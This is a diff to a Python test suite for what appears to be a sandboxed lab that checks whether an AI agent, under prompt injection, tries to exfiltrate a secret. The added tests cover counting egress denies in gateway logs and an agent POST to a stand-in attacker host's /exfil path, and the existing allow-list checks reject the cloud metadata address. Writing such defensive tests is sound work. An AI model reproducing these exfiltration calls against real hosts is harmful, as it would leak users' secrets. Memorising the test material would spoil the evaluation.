@@ -11,6 +11,7 @@ from unittest.mock import patch
 from lib.challenge import evaluate_challenge, render_challenge
 from lib.collect import count_exfil_attempts, count_attacker_server_hits
 from lib.criteria import evaluate
+from score_lab01 import count_egress_denies
 from lib.injection import apply_legit_injection, legit_call_status
 from lib.report import render_compare, render_table
 
@@ -56,11 +57,28 @@ class CriteriaTest(unittest.TestCase):
                 "canary_token_hits": 0,
                 "exfil_successes": 0,
                 "exfil_attempts": 2,
+                "egress_denies": 2,
                 "legit_api_injected": True,
             },
         )
         self.assertTrue(verdict["exercise_pass"])
         self.assertEqual(verdict["injection_demo"], "pass")
+        names = [item["name"] for item in verdict["criteria"]]
+        self.assertIn("egress_denies", names)
+
+    def test_sandboxed_fail_when_gateway_records_no_deny(self) -> None:
+        verdict = evaluate(
+            "sandboxed",
+            {
+                "secret_visible_to_agent": False,
+                "canary_token_hits": 0,
+                "exfil_successes": 0,
+                "exfil_attempts": 2,
+                "egress_denies": 0,
+                "legit_api_injected": True,
+            },
+        )
+        self.assertFalse(verdict["exercise_pass"])
 
     def test_sandboxed_fail_when_agent_never_tries(self) -> None:
         verdict = evaluate(
@@ -88,6 +106,21 @@ class CriteriaTest(unittest.TestCase):
         )
         self.assertFalse(verdict["exercise_pass"])
         self.assertEqual(verdict["injection_demo"], "fail")
+
+
+class EgressDenyCountTest(unittest.TestCase):
+    def test_agentgateway_counts_only_the_attacker_server_deny_line(self) -> None:
+        logs = "\n".join(
+            [
+                '2026-10-19T11:15:56.301332Z\terror\trequest http.method=POST http.host=attacker-server.lab01-shared.svc.cluster.local http.path=/exfil http.status=403 error="actor egress policy denied destination" reason=Authorization duration=4ms',
+                "debug host=attacker-server.lab01-shared.svc.cluster.local CONNECT tunnel terminated target=10.96.22.12:80",
+                'error http.host=dummy.lab01.svc.cluster.local http.status=403 error="actor egress policy denied destination"',
+                'error http.host=attacker-server.lab01-shared.svc.cluster.local http.status=403 error="actor egress policy denied destination"',
+                'error http.host=attacker-server.lab01-shared.svc.cluster.local body="egress denied"',
+            ]
+        )
+        self.assertEqual(count_egress_denies(logs, "agentgateway"), 2)
+        self.assertEqual(count_egress_denies(logs, "envoy"), 3)
 
 
 class CollectHelpersTest(unittest.TestCase):
@@ -211,6 +244,66 @@ class AgentPolicyTest(unittest.TestCase):
         self.assertFalse(module.lab_host_allowed("https://example.com/exfil"))
         self.assertFalse(module.lab_host_allowed("http://169.254.169.254/latest"))
         self.assertFalse(module.lab_host_allowed("http://user:pass@attacker-server.lab01-shared.svc/exfil"))
+
+    def test_dial_map_keeps_the_host_and_connects_to_the_address(self) -> None:
+        import importlib.util
+        import threading
+        from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
+
+        path = LAB / "agent" / "agent.py"
+        spec = importlib.util.spec_from_file_location("lab01_agent_dial", path)
+        assert spec and spec.loader
+        module = importlib.util.module_from_spec(spec)
+        spec.loader.exec_module(module)
+        seen: dict[str, str] = {}
+
+        class Handler(BaseHTTPRequestHandler):
+            def log_message(self, fmt: str, *args: object) -> None:
+                return
+
+            def do_POST(self) -> None:  # noqa: N802
+                length = int(self.headers.get("Content-Length", "0") or "0")
+                self.rfile.read(length)
+                seen["host"] = self.headers.get("Host", "")
+                raw = b"ok"
+                self.send_response(200)
+                self.send_header("Content-Length", str(len(raw)))
+                self.end_headers()
+                self.wfile.write(raw)
+
+        server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
+        port = server.server_address[1]
+        thread = threading.Thread(target=server.serve_forever, daemon=True)
+        thread.start()
+        try:
+            mapping = module.parse_dial_map(
+                f"attacker-server.lab01-shared.svc.cluster.local=127.0.0.1,"
+                f"example.com=127.0.0.1,dummy.lab01.svc=not-an-ip"
+            )
+            self.assertEqual(
+                mapping, {"attacker-server.lab01-shared.svc.cluster.local": "127.0.0.1"}
+            )
+            with patch.object(module, "parse_dial_map", return_value=mapping):
+                # The mapped address is 127.0.0.1 with no port. Point the
+                # connection at the ephemeral server by wrapping create_connection.
+                real_create = module.socket.create_connection
+
+                def create(address, timeout=None, source_address=None):  # type: ignore[no-untyped-def]
+                    host, _ = address
+                    if host == "127.0.0.1":
+                        address = ("127.0.0.1", port)
+                    return real_create(address, timeout, source_address)
+
+                with patch.object(module.socket, "create_connection", side_effect=create):
+                    step = module.http_post(
+                        "http://attacker-server.lab01-shared.svc.cluster.local/exfil",
+                        {"key": "", "source": "lab01"},
+                    )
+        finally:
+            server.shutdown()
+        self.assertEqual(step["status"], 200)
+        self.assertEqual(step["dial_ip"], "127.0.0.1")
+        self.assertEqual(seen["host"], "attacker-server.lab01-shared.svc.cluster.local")
 
     def test_mock_posts_other_in_cluster_hosts_and_refuses_outside_dns(self) -> None:
         import importlib.util
